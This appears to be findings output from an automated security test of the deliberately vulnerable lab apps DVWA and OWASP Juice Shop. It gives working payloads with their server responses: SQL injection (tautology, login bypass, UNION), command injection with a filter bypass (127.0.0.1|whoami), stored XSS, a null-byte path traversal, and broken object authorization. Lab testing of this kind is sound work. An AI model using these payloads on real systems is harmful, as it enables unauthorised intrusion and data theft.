endpoints.observation_evidence: [security=high] GET /vulnerabilities/sqli/ at high security level no longer renders an inline id-input form (the form is removed); page shows only a 'Click here to change your ID' link to session-input.php. The page still accepts id via query string (?id=) which is populated from the session value set via session-input.php, and results render here. Distinct from low/medium GET form-based instance -- requires the out-of-band session-input.php submission first, then reading this GET endpoint to view results with a LIMIT 1 trailing-comment bypass payload (e.g. 1' OR '1'='1' #).

[security=high] Confirmed security level is high (page footer shows 'Security Level: high'). Form unchanged structurally from low/medium: action=/vulnerabilities/exec/, method=POST, fields ip[text], Submit[submit]. Per DVWA source behavior at high security, blacklist filters '; ', '| ' (pipe+space), and '&&' -- requires pipe with NO trailing space (e.g. 127.0.0.1|whoami) to bypass. This is a distinct high-security command-injection instance vs the medium-security pipe-with-space bypass already confirmed.

[security_level=medium] Form fields/maxlengths identical to low (txtName maxlength=10, mtxMessage maxlength=50). Existing guestbook entries ('test'/'tester') still render plain text. Per DVWA medium source, only txtName applies strip_tags() filtering; mtxMessage field has no server-side filtering at medium (same as low), so the canary script payload in mtxMessage is expected to remain exploitable - verifier should confirm by submitting canary into mtxMessage (not txtName) and checking rendered page/browser_eval_js.

findings.title: SQL Injection in DVWA SQLi page (id parameter) - low security
findings.response_evidence: [security=low] TRUE payload id=1' OR '1'='1 returned 5 user records: (admin/admin), (Gordon/Brown), (Hack/Me), (Pablo/Picasso), (Bob/Smith) - visible as repeated 'ID: 1' OR '1'='1 First name: ... Surname: ...' blocks in the page body. FALSE payload id=1' AND '1'='2 returned zero records - the page body contained only the empty 'User ID:' prompt with no ID/First name/Surname blocks at all. This confirms the raw single-quoted input is concatenated unsanitized into the SQL query, enabling boolean-based SQL injection.

findings.title: OS Command Injection via pipe bypass (no trailing space) at HIGH security
findings.response_evidence: [security=high] Response page footer confirms 'Security Level: high'. The pre_blocks output from the ping command contained exactly the string 'www-data', proving the piped whoami command executed server-side despite the high-security blacklist filtering '; ', '| ' (pipe+space), and '&&'. Payload '127.0.0.1|whoami' (pipe immediately followed by command, no space) bypassed the filter. Full visible_text excerpt: 'Vulnerability: Command Injection ... Enter an IP address: www-data ... Security Level: high'.

findings.title: Stored XSS in DVWA Guestbook (mtxMessage field) - low security
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ form_data={txtName: 'tester', mtxMessage: '<script id=\"test_token\">window.xss_flag=1</script>', btnSign: 'Sign Guestbook'} (session=dvwa_admin)
findings.response_evidence: [security=low] After submission, the guestbook page rendered a new entry 'Name: tester' with the following script element visible server-side in the HTML. Browser verification: browser_eval_js('window.xss_flag') returned 1 (JS result: {"result": 1}), and browser_read_dom('#test_token') confirmed the element exists in the live DOM with inner_text 'window.xss_flag=1', proving the injected <script id="test_token"> tag was stored unsanitized and executed in the authenticated admin browser context when the guestbook page was rendered.
findings.browser_js_evidence: window.xss_flag === 1 (confirmed via browser_eval_js); DOM element #test_token inner_html_excerpt: "window.xss_flag=1"

findings.title: SQL Injection via numeric boolean payload in POST id parameter (medium security)
request_sequence: POST http://dvwa/vulnerabilities/sqli/ with form_data={id: '1 OR 1=1', Submit: 'Submit'} (session=dvwa_admin, security=medium)
POST http://dvwa/vulnerabilities/sqli/ with form_data={id: '1 AND 1=2', Submit: 'Submit'} (session=dvwa_admin, security=medium)
findings.response_evidence: [security=medium] Confirmed server-reported Security Level: medium in both responses. TRUE payload id='1 OR 1=1' returned multiple seeded user records: 'ID: 1 OR 1=1 First name: admin Surname: admin', 'ID: 1 OR 1=1 First name: Gordon Surname: Brown', 'ID: 1 OR 1=1 First name: Hack Surname: Me', 'ID: 1 OR 1=1 First name: Pablo Surname: Picasso', 'ID: 1 OR 1=1 First name: Bob Surname: Smith' (5 rows returned instead of the expected single row for a dropdown-constrained id). FALSE payload id='1 AND 1=2' returned zero records (no 'ID:' blocks present in response, only the empty User ID selector). This confirms the medium-level form (select dropdown submitted via POST) is still vulnerable to raw numeric SQL injection bypassing the dropdown constraint by sending arbitrary form_data directly.

findings.title: SQL Injection via out-of-band session-input id parameter (TRUE/FALSE differential) at HIGH security
findings.response_evidence: [security=high] Security level confirmed as 'high' in page footer. At high security, the id parameter must be set out-of-band via session-input.php (the inline form is replaced by a 'Click here to change your ID' link), and the backend query appends 'LIMIT 1', requiring a trailing comment to extract multiple rows via UNION-style boolean injection using stacked OR conditions across the comment. TRUE payload id=1' OR '1'='1' # produced 5 distinct records when GET /vulnerabilities/sqli/?id= was loaded: 'First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE payload id=1' AND '1'='2' # produced zero records -- the subsequent GET /vulnerabilities/sqli/?id= page showed no 'First name:'/'Surname:' blocks at all (only the static page chrome and 'Click here to change your ID' link), confirming the classic TRUE-returns-multiple-rows / FALSE-returns-zero-rows boolean SQLi differential.

findings.title: Cross-User Basket Access (BOLA) - acct2 can read acct1's basket
request_sequence: GET /rest/basket/6 as juiceshop_acct1 (own_basket_id=6) -> returns UserId=22, Products=[{id:1,name:'Apple Juice (1000ml)', BasketItem:{quantity:3}}]
GET /rest/basket/6 as juiceshop_acct2 (own_basket_id=7, different account) -> HTTP 200, returns the SAME basket data belonging to acct1 (UserId=22)
findings.response_evidence: Authenticated as juiceshop_acct2 (own basket id = 7), requested GET /rest/basket/6 which belongs to acct1 (UserId=22). Response: HTTP 200 {"status":"success","data":{"id":6,"UserId":22,"Products":[{"id":1,"name":"Apple Juice (1000ml)","BasketItem":{"ProductId":1,"BasketId":6,"id":9,"quantity":3}}]}}. acct2's bearer token/session was accepted to view acct1's distinct seeded basket item (Apple Juice 1000ml, quantity 3) with no ownership check enforced on the basket id parameter, confirming Broken Object Level Authorization.

findings.title: Login Authentication-Bypass SQL Injection via email field
findings.response_evidence: Sent POST to /rest/user/login as unauthenticated session with body {"email":"' OR 1=1--","password":"anything"}. Server returned HTTP 200 with a valid authentication object: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. The "umail" field confirms the backend authenticated as the FIRST user in the database (admin@juice-sh.op, typically user id 1) despite supplying no valid credentials, and issued a legitimate JWT auth token — demonstrating the raw SQL query (e.g. SELECT * FROM Users WHERE email='<input>' AND password=[REDACTED] was manipulated via the classic ' OR 1=1-- tautology to bypass authentication entirely.

findings.title: Product Search SQL Injection (error-based + UNION-based)
request_sequence: GET /rest/products/search?q=qwert' (unauth) -> HTTP 500 'Error: SQLITE_ERROR: near "'%'": syntax error'
findings.response_evidence: 1) Request GET /rest/products/search?q=qwert%27 returned HTTP 500 with body "Error: SQLITE_ERROR: near \"'%'\": syntax error" — confirming the single quote in the q parameter breaks out of the backend SQL query string, proving unsanitized string concatenation. 2) Request GET /rest/products/search?q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- returned HTTP 200 with a benign JSON response whose "data" array contains a single row with fields name=2, description=3, price=4, deluxePrice=5, image=6, createdAt=7, updatedAt=8, deletedAt=9 — these are literally the integer constants from the injected UNION SELECT, not real product data, proving the 9-column UNION injection was successfully executed against the backend query. Both the error-based and UNION-based behavioral signatures were observed, confirming exploitable SQL injection in the product search endpoint.

findings.title: Open Directory Listing on /ftp/ exposes confidential acquisitions memo
findings.response_evidence:
GET /ftp/ (unauth, Accept: text/html,application/json) -> HTTP 200 directory listing with visible_text: 'listing directory /ftp/ ~ / ftp / quarantine ... acquisitions.md 909 12/19/2023 1:12:12 PM announcement_encrypted.md ... coupons_2013.md.bak ... incident-support.kdbx ... legal.md ... package.json.bak ... suspicious_errors.yml' and a direct hyperlink to http://juiceshop:3000/ftp/acquisitions.md. Follow-up GET /ftp/acquisitions.md -> HTTP 200, content-type text/markdown, body: '# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year. This will have a significant stock market impact as we will elaborate in detail in the following paragraph: ... Our shareholders will be excited. It's true. No fake news.' This confirms both the open directory listing (CWE-200) and retrieval of the confidential acquisition memo content without authentication.

GET /api/Feedbacks HTTP/1.1
(no Authorization header, no session/cookie)
findings.response_evidence: GET /api/Feedbacks with no authentication headers/session returns HTTP 200 and a JSON array of 8 feedback records tied to real UserId values (1,2,3,21) whose comment text embeds partially-masked email addresses revealing domain and suffix, e.g. '\"comment\":\"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)\",\"UserId\":1', '\"comment\":\"Great shop! Awesome service! (***@juice-sh.op)\",\"UserId\":2', '\"comment\":\"Nothing useful available here! (***der@juice-sh.op)\",\"UserId\":3', and '\"comment\":\"Please send me the juicy chatbot NFT in my wallet ... (***ereum@juice-sh.op)\",\"UserId\":21'. This confirms the endpoint discloses feedback author PII (email address fragments linked to specific UserIds) to unauthenticated callers, violating the expectation that feedback authorship/contact data require authentication/authorization to view.

findings.title: Exposed Encryption Keys Directory listing at /encryptionkeys/
findings.response_evidence: GET /encryptionkeys/ (unauth) -> HTTP 200, content-type text/html, directory listing visible_text: 'listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM', with hyperlinks to http://juiceshop:3000/encryptionkeys/jwt.pub and http://juiceshop:3000/encryptionkeys/premium.key. This confirms the encryption keys directory is browsable without authentication and exposes the sensitive key filenames jwt.pub (JWT public key) and premium.key (premium feature unlock key), both directly retrievable via the listed links.

findings.title: Poison Null-Byte Path Traversal bypasses .bak file extension filter under /ftp/
findings.response_evidence:
Step 1: GET /ftp/package.json.bak returned HTTP 403 with body: 'Error: Only .md and .pdf files are allowed! ... at verify (/juice-shop/build/routes/fileServer.js:55:18)' confirming the extension filter blocks direct .bak access.

Step 2: GET /ftp/package.json.bak%2500.md (URL-encoded null byte + allowed .md extension appended) returned HTTP 200, content_type: application/octet-stream, with body being the actual contents of package.json: '{\n  \"name\": \"juice-shop\",\n  \"version\": \"6.2.0-SNAPSHOT\", ... \"dependencies\": {...} ...}'. This proves the null-byte bypass circumvents the extension filter (which checks the trailing .md suffix) while the underlying filesystem read (Node.js fs, pre-ES2018 null-terminated string behavior in older environments / path resolution) serves the original restricted package.json.bak file content. Both criteria (403 on raw path + 200 with real file content via null-byte bypass) are satisfied.
